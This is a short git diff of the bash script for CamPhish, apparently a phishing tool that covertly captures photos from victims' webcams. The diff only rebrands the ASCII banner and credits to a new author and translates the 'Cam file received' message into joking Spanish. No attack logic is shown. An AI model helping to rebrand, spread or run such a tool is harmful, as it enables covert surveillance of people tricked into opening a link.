@@ -14,9 +14,9 @@ printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | 
 printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
 printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
+printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \| by nano\e[0m\n"
 printf " \e[1;93m CamPhish Ver 1.5 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;77m github.com/NaNoFernando | www.youtube.com/channel/UCS0DVOZzNitulWmKUKKKYxg \e[0m \n"
 
 printf "\n"
 
@@ -80,7 +80,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] recibi una imagen xD !\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
